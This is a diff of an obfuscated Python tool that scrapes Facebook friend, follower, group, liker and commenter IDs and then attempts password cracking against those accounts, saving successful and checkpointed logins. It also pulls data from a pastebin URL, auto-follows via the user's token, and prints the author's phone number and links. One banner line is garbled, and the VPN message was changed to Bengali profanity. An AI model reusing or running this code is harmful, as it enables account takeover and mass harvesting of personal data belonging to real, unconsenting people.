@@ -14,7 +14,7 @@ _req_ses_  = requests.Session()
 _req_get_  = requests.get
 _req_post_ = requests.post
 _js_lo_    = json.loads
-_cici_MollaVai_    = input
+_cici_azimvau_    = input
 _azimvau_dapunta_ = open
 _cici_cici_       = exit
 
@@ -57,7 +57,7 @@ basesplit = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace(
 try:
     rq = requests.get('https://pastebin.com/raw/nEpjt6QN').text
 except requests.exceptions.ConnectionError:
-    print('\nPLZ USE VPN AND TRY AGIN\n')
+    print('\nAMI AKTA MADARXUD TAI VPN USE KORI NAI👉👌\n')
     exit()
 
 ### Waktu & Tanggal
@@ -120,13 +120,13 @@ def clear():
 logo ="""
 \033[1;91m     __  __  ___  _     _        _     __     ___    ___ \033[1;0m
 \033[1;91m     |  \/  |/ _ \| |   | |      / \    \ \   / / \  |_ _|\033[1;0m
-\033[1;97m     | |\/| | | | | |   | |     / _ \    \ \ / / _ \  | |\033[1;0m
+\033[1;97m     | |\/| | | | | |   | |     / _ \    \ \ / / _ \  | |\  .  . 033[1;0m
 \033[1;97m     | |  | | |_| | |___| |___ / ___ \    \ V / ___ \ | | \033[1;0m
 \033[1;91m     |_|  |_|\___/|_____|_____/_/   \_\    \_/_/   \_\___|\033[1;0m
 \033[1;97m--------------------------------------------------
-\033[1;91m Author      :MOLLA_VAI 
+\033[1;91m Author             :MOLLA_VAI 
  
-\033[1;91m GitHub      : https://github.com/Mohammadjan1122
+\033[1;91m GitHub             :https://github.com/POROSMOLLA
 \033[1;91m FACEBOOK     : https://www.facebook.com/pores.khan.10
 \033[1;91m WHATSAPP    : 01863461968
 \033[1;97m--------------------------------------------------
@@ -156,18 +156,18 @@ def menu_log():
     bersih();clear()
     banner()
     var_menu()
-    pmu = _cici_MollaVai_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
+    pmu = _cici_azimvau_('%s [%s•%s] %sCHOOSE : %s'%(H,P,H,K,H))
     print('%s '%(O))
     if pmu in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu_log()
     elif pmu in ['1','01','001','a']:
         defaultua()
-        token = _cici_Mollavai_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
+        token = _cici_azimvau_('%s [%s•%s] %sTOKEN : %s'%(H,P,H,K,H))
         try:x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'];xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write('null');xz.close();bot_follow(token);menu()
         except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sTOKEN INVALID'%(M,P,M,P));bersih();menu_log()
         except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
     elif pmu in ['2','02','002','b']:
         defaultua()
-        cookie = _cici_MollaVai_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
+        cookie = _cici_azimvau_('%s [%s•%s] %sCOOKIES : %s'%(H,P,H,K,H))
         try:header={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7','cookie': cookie};r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header);p=re.search('{"accessToken":"(EAA\w+)', r.text);token=p.group(1);xd = _azimvau_dapunta_("token.txt", "w");xd.write(token);xd.close();xz = _azimvau_dapunta_('cookies.txt','w');xz.write(cookie);xz.close();bot_follow(token);menu()
         except requests.exceptions.ConnectionError:print('%s '%(O));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
         except (KeyError,IOError,AttributeError):print('%s '%(O));jalan('%s [%s!%s] %sCOOKIES INVALID'%(M,P,M,P));bersih();menu_log()
@@ -180,12 +180,12 @@ def menu():
     banner()
     jid = ''
     try:
-        _MollaVai_ = _MollaVai_dapunta_("token.txt","r").read();_cici_ = _MollaVai_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
+        _azimvau_ = _azimvau_dapunta_("token.txt","r").read();_cici_ = _azimvau_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
         if 'null' in _cici_:status_cookies = ('%sNO'%(M));W = Z;Y = P; B1 = Z; O1 = Z; K1 = Z; H1 = Z; M1 = Z; P1 = Z
         else:status_cookies = ('%sYES'%(H));W = H; Y = K; B1 = B; O1 = O; K1 = K; H1 = H; M1 = M; P1 = P
     except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
     
-    try:token = _MollaVai_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
+    try:token = _azimvau_dapunta_("token.txt","r").read();x = _req_get_("https://graph.facebook.com/me?access_token=" + token);y = _js_lo_(x.text);n = y['name'].upper();i = y['id']
     except (KeyError,IOError):print('%s [ %sOPPSS :) %s]%s'%(M,P,M,M));print('%s '%(M));jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));bersih();menu_log()
     except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
     except requests.exceptions.ConnectionError:print('%s [ %sOPPSS :) %s]%s'%(M,P,M,P));print('%s '%(M));jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));_cici_cici_()
@@ -220,7 +220,7 @@ def menu():
     psb('%s [%s19%s] %s FILE'%(H,P,H,H))
     psb('%s [%s00%s] %sLOGOUT'%(H,M,H,M))
     print('')
-    pm = _cici_MollaVai_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
+    pm = _cici_azimvau_('%s [%s>_%s] %sCHOOSE : %s'%(H,P,H,K,H))
     print('%s '%(O))
     if pm in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(P,M,P,M));menu()
     elif pm in ['1','01','001','a']:publik(token)
@@ -248,7 +248,7 @@ def menu():
 
 def defaultua():
     ua = ua_xiaomi
-    try:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
+    try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close()
     except (KeyError,IOError):menu_log()
 
 
@@ -259,15 +259,15 @@ def ugen():
     if pmu in[""]:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
     elif pmu in ['1','01','001','a']:os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8');_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,K));menu()
     elif pmu in ['2','02','002','b']:
-        os.system("rm -rf ugent.txt");ua = _cici_MollaVai_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
-        try:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_MollaVai_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
-        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_MollaVai_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
+        os.system("rm -rf ugent.txt");ua = _cici_azimvau_("%s [%s•%s] %sENTER USER AGENT : \n\n"%(H,P,H,K))
+        try:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua);ugent.close();jalan("\n%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
+        except (KeyError,IOError):jalan("\n%s [ %sFAILED TO CHANGE USER AGENT %s]"%(Z,M,Z));print('%s '%(M));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
     elif pmu in ['3','03','003','c']:ugen_hp()
-    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_MollaVai_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
+    elif pmu in ['4','04','004','d']:os.system("rm -rf ugent.txt");jalan("%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
     elif pmu in ['5','05','005','e']:
         try:ungser = _azimvau_dapunta_('ugent.txt', 'r').read()
         except (KeyError,IOError):ungser = 'NOT FOUND'
-        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_MollaVai_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
+        print("%s [%s•%s] %sYOUR USER AGENT  : \n\n%s%s"%(H,P,H,P,O,ungser));jalan("\n%s [ %sTHIS IS YOUR CURRENT USER AGENT %s]"%(H,K,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(H,P,H,K));menu()
     elif pmu in ['0','00','000','f']:menu()
     else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P))
 def ugen_hp():
@@ -282,29 +282,29 @@ def ugen_hp():
     print('%s [%s8%s] %sWINDOWS'%(H,P,H,M))
     print('%s [%s9%s] %sXIAOMI'%(H,P,H,M))
     print('')
-    pc = _cici_MollaVai_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
+    pc = _cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K))
     print('%s '%(O))
     if pc in['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,M));menu()
-    elif pc in ['1','01']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
-    elif pc in ['2','02']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
-    elif pc in ['3','03']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
-    elif pc in ['4','04']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
-    elif pc in ['5','05']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
-    elif pc in ['6','06']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
-    elif pc in ['7','07']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
-    elif pc in ['8','08']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
-    elif pc in ['9','09']:ugent = _MollaVai_dapunta_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
+    elif pc in ['1','01']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
+    elif pc in ['2','02']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
+    elif pc in ['3','03']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
+    elif pc in ['4','04']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
+    elif pc in ['5','05']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
+    elif pc in ['6','06']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
+    elif pc in ['7','07']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
+    elif pc in ['8','08']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
+    elif pc in ['9','09']:ugent = _azimvau_dapunta_('ugent.txt','w');ugent.write(ua_intelmac);ugent.close()
     else:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
-    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_MollaVai_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
+    jalan("%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]"%(H,P,H));print('%s '%(O));_cici_azimvau_('%s [ %sBACK %s]%s'%(M,P,M,P));menu()
 
 
 def publik(token):
     jid = '5000'
     try:
-        print('%s [%s•%s] %sWRITE \'me\' TO RETRIEVE FRIEND ID'%(H,P,H,K));it = _cici_MollaVai_("%s [%s•%s] %sTARGET ID : "%(H,P,H,K));cek_target_crack_(it)
+        print('%s [%s•%s] %sWRITE \'me\' TO RETRIEVE FRIEND ID'%(H,P,H,K));it = _cici_azimvau_("%s [%s•%s] %sTARGET ID : "%(H,P,H,K));cek_target_crack_(it)
         try:pb = _req_get_("https://graph.facebook.com/" + it + "?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + token);ob = _js_lo_(pb.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,ob['name']))
         except (KeyError,IOError):print('%s '%(O));jalan('%s [%s!%s] %sID NOT FOUND'%(M,P,M,P));menu()
-        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _MollaVai_dapunta_(xc,"w")
+        r = _req_get_("https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s"%(it,jid,token));id = [];z = _js_lo_(r.text);xc = (ob["first_name"]+".json").replace(" ","_");xb = _azimvau_dapunta_(xc,"w")
         for a in z["data"]:
             try:id.append(a["id"]+"•"+a["name"]);xb.write(a["id"]+"•"+a["name"]+"\n")
             except:continue
@@ -353,7 +353,7 @@ def pengikut(token):
 
 
 def followers(cookies):
-    _query_ = _cici_MollaVai_('%s [%s•%s] %sENTER TARGET ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
+    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER TARGET ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json';_url_dev_ = 'https://mbasic.facebook.com/subscribe/lists/?id=' + _query_;_file_ = (_query_+'.json').replace(' ','_')
     try:os.remove(_file_)
     except:pass
     exec_followers(_url_dev_,cookies,_file_);print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
@@ -375,56 +375,56 @@ def exec_followers(url,cookies,_file_):
 
 
 
-def main_likers(_MollaVai_):
-    _query_ = _cici_MollaVai_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
+def main_likers(_azimvau_):
+    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
     try:os.remove(_query_+'.json')
     except:pass
-    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_MollaVai_,_url_,_file_)
-    if len(_MollaVai_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
-    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_MollaVai_dapunta_(_file_).read().splitlines())));return crack(_file_)
-def scrape_likers(_MollaVai_,_url_,_file_):
-    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_MollaVai_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_MollaVai_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_);scrape_likers(_azimvau_,_url_,_file_)
+    if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
+    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def scrape_likers(_azimvau_,_url_,_file_):
+    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             for _id_ in _isi_.find_all('a',href=True):
                 try:
-                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_MollaVai_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
-                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_MollaVai_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
+                    if "profile.php" in _id_.get("href"):_a_ = _id_.get("href").split('=')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
+                    else:_a_ = _id_.get("href").split('/')[1];__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(_a_+'•'+__id__+'\n')
                 except:continue
         for _lanjut_ in _ses_par_.find_all("a",href=True):
             if "See more" in _lanjut_.text:
                 while True:
-                    try:scrape_likers(_MollaVai_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                     except Exception as e:print('%s%s'%(M,e))
-    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_MollaVai_dapunta_(_file_).read().splitlines())));return crack(_file_)
+    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
 
 
-def main_komen(_MollaVai_):
-    _query_ = _cici_MollaVai_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
+def main_komen(_azimvau_):
+    _query_ = _cici_azimvau_('%s [%s•%s] %sENTER POST ID : '%(H,P,H,K));print("%s [%s•%s] %sPRESS CTRL+C TO STOP DUMP"%(H,P,H,K));_file_ = _query_+'.json'
     try:os.remove(_query_+'.json')
     except:pass
-    _MollaVai_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_MollaVai_,_url_,_file_)
+    _azimvau_dapunta_(_file_,'w');_url_ = ('https://mbasic.facebook.com/'+_query_);scrape_komen(_azimvau_,_url_,_file_)
     if len(_azimvau_dapunta_(_file_).read().splitlines()) == 0:print('\n%s [%s!%s] %sPOST NOT FOUND'%(M,P,M,P));_cici_cici_()
-    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_MollaVai_dapunta_(_file_).read().splitlines())));return crack(_file_)
-def scrape_komen(_MollaVai_,_url_,_file_):
-    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_MollaVai_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_MollaVai_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
+    print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
+def scrape_komen(_azimvau_,_url_,_file_):
+    _ses_ = _req_ses_;_url_load_ = _ses_.get(_url_,cookies=_azimvau_,headers=header_grup).text.encode("utf-8");_ses_par_ = par(_url_load_,'html.parser');print("\r%s [%s•%s] %sTAKING %s%s ID"%(H,P,H,K,H,len(_azimvau_dapunta_(_file_).read().splitlines())), end=' ');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             for _id_ in _isi_.find_all('a',href=True):
                 try:
-                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_MollaVai_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
+                    if "profile.php" in _id_.get("href"):_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('&')[0]+'•'+__id__+'\n')
                     else:_a_="".join(bs4.re.findall("/(.*?)\?",_id_.get("href")));__id__ = _id_.text;_azimvau_dapunta_(_file_,'a+').write(str(_a_).split('?')[0]+'•'+__id__+'\n')
                 except:continue
         for _lanjut_ in _ses_par_.find_all("a",href=True):
             if "View more comments…" in _lanjut_.text:
                 while True:
-                    try:scrape_komen(_MollaVai_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    try:scrape_komen(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                     except Exception as e:print('%s%s'%(M,e))
             elif "View previous comments…" in _lanjut_.text:
                 while True:
-                    try:scrape_likers(_MollaVai_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
+                    try:scrape_likers(_azimvau_,"https://mbasic.facebook.com/"+_lanjut_.get("href"),_file_);break
                     except Exception as e:print('%s%s'%(M,e))
-    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_MollaVai_dapunta_(_file_).read().splitlines())));return crack(_file_)
+    except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID"%(H,P,H,K,len(_azimvau_dapunta_(_file_).read().splitlines())));return crack(_file_)
 
 
 class dump_grup:
@@ -439,7 +439,7 @@ class dump_grup:
         if len(self.glist) !=0:
             print("%s [%s•%s] %sYOU JOIN %s%s%s GROUP"%(H,P,H,K,O,len(self.glist),P));print('%s [%s1%s] %sSEARCH ALL GROUPS JOIN'%(H,P,H,K));print('%s [%s2%s] %sSEARCH GROUPS BY NAME'%(H,P,H,K));print('%s [%s3%s] %sSEARCH GROUPS BY ID'%(H,P,H,K))
             while True:
-                c=_cici_MollaVai_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K));print('%s '%(O))
+                c=_cici_azimvau_('%s [%s•%s] %sCHOOSE : '%(H,P,H,K));print('%s '%(O))
                 if c=="":continue
                 elif c=="1":self.saya()
                 elif c=="2":self.search()
@@ -455,12 +455,12 @@ class dump_grup:
             url = "https://graph.facebook.com/me/groups?access_token={}".format(self.token)
             with _req_ses_ as ses_:
                 data = ses_.get(url).json()
-                for _MollaVai_ in data["data"]:
-                    try:self._grup_.append(_MollaVai_["id"])
+                for _azimvau_ in data["data"]:
+                    try:self._grup_.append(_azimvau_["id"])
                     except:pass
             for _cici_ in self._grup_:
-                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_MollaVai_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
-                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_MollaVai_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+                try:self.url_grup = ("https://mbasic.facebook.com/browse/group/members/?id=%s"%(_cici_));self.exec_grup_saya();print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
+                except KeyboardInterrupt:print("\n%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP"%(H,P,H,P,len(_azimvau_dapunta_(self.fl).read().splitlines())));return crack(self.fl)
                 except Exception as _error_:print('\n%s [%s!%s] %sERROR IN SECTION : %s'%(M,P,M,P,_error_));_cici_cici_()
         except (KeyError,IOError):jalan('%s [%s!%s] %sCOOKIE INVALID'%(M,P,M,P));menu()
         except requests.exceptions.ConnectionError:jalan('%s [%s!%s] %sCONNECTION PROBLEM'%(M,P,M,P));menu()
@@ -1266,17 +1266,17 @@ class crack:
                     files_cp = "CP/%s.txt"%(tanggal)
                     if fl.get("id") in files_cp:pass
                     else:
-                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _MollaVai_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
+                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _azimvau_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
                         except:ttll = (''%())
                         h_cp = "\r %s[%sCP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
-                        self.cp.append("%s•%s"%(fl.get("id"),i));_MollaVai_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
+                        self.cp.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
                 elif log.get("status")=="ok":
                     files_ok = "OK/%s.txt"%(tanggal)
                     if fl.get("id") in files_ok:pass
                     else:
                         if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sSUCCESSFULL%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
                         else:print("\r %s[%sSUCCESSFULL%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
-                        self.ada.append("%s•%s"%(fl.get("id"),i));_MollaVai_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
+                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                 else:continue
             self.ko+=1
             print("\r %s[%sCracking%s][%s%s/%s%s][%sGOOD:%s%s][%sCP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
@@ -1285,8 +1285,8 @@ class crack:
 
 ### Mendapat Jumlah Teman Target
 def teman_target():
-    it = _cici_MollaVai_('%s [%s•%s] %sTARGET ID :%s '%(H,P,H,K,H))
-    try:token = _MollaVai_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,nn['name']))
+    it = _cici_azimvau_('%s [%s•%s] %sTARGET ID :%s '%(H,P,H,K,H))
+    try:token = _azimvau_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);print ('%s [%s•%s] %sNAME : %s'%(H,P,H,K,nn['name']))
     except (KeyError,IOError):jalan('%s [%s!%s] %sTOKEN/COOKIES INVALID'%(M,P,M,P));menu_log()
     tt=[];te=[];lim = _cici_azimvau_('%s [%s•%s] %sDUMP LIMIT : %s'%(H,P,H,K,H));print('%s %s'%(O,P));ada = _req_get_('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token));idi = _js_lo_(ada.text)
     for x in idi['data']:tt.append(x['id'])
@@ -1338,7 +1338,7 @@ def cek_result():
     except:pass
